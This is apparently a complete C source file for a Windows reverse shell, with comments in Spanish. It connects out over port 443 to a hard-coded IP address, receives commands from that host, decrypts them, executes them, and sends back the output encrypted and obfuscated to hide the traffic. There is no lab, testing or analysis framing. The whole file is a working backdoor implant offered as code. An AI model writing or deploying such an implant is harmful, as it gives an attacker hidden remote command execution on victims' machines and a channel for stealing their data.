#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "crypto.h"

#pragma comment(lib, "ws2_32.lib")

#define PORT 443

int main() {
    WSADATA wsaData;
    SOCKET server_socket;
    struct sockaddr_in server_addr;
    char buf[4096];

    // Inicializa Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        return EXIT_FAILURE;
    }

    // Crea un socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        perror("Unable to create socket");
        WSACleanup();
        return EXIT_FAILURE;
    }

    // Configura la dirección del servidor
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "192.168.18.193", &(server_addr.sin_addr));

    // Conecta al servidor
    if (connect(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        perror("Unable to connect");
        closesocket(server_socket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Connected to server.\n");

    // Bucle para enviar el resultado del comando al servidor
    while (1) {
        // Espera y recibe el comando del cliente
        memset(buf, 0, sizeof(buf));
        int bytes_received = recv(server_socket, buf, sizeof(buf), 0);
        if (bytes_received <= 0) {
            // Error o conexión cerrada por el cliente
            perror("Error receiving data");
            break;
        }

        // Descifra el comando recibido del cliente antes de ejecutarlo
        char decryptedBuf[4096];
        encryptDecrypt(buf, decryptedBuf, bytes_received);
        printf("Received command from server: %s\n", decryptedBuf);

        // Ejecuta el comando y obtiene el resultado
        char *result = executeCommand(decryptedBuf);

        // Cifra y obfusca el resultado del comando antes de enviarlo
        char encryptedResult[4096];
        encryptDecrypt(result, encryptedResult, strlen(result));
        send(server_socket, encryptedResult, strlen(encryptedResult), 0);

        // Libera la memoria asignada para el resultado del comando
        free(result);
    }

    // Cierra el socket
    closesocket(server_socket);

    // Limpia recursos de Winsock
    WSACleanup();

    return 0;
}
